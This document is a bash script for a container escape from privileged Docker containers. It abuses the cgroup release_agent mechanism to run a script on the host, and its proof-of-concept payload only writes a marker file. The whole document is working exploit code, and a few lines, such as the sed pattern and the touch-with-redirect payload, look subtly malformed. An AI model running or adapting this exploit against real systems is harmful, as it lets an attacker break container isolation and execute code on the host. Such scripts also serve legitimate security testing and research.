#!/bin/bash
# Docker version <= 1.12 and privileged containers: 
# This script could potentially work in this setup.

# Step 1: Create directory and mount cgroup
mkdir -p /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x

# Step 2: Set notify_on_release to 1
echo 1 > /tmp/cgrp/x/notify_on_release

# Step 3: Extract host_path from /etc/mtab
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 4: Set release_agent path to exploit
echo "$host_path/exploit" > /tmp/cgrp/release_agent

# Step 5: Create the exploit script
echo '#!/bin/sh' > /exploit

# Step 6: save a file on docker host machine
echo "touch 'Container escaped' > $host_path/escape_marker.txt" >> /exploit

# Step 7: Make the exploit script executable
chmod a+x /exploit

# Step 8: Trigger the release agent by assigning the process to the cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
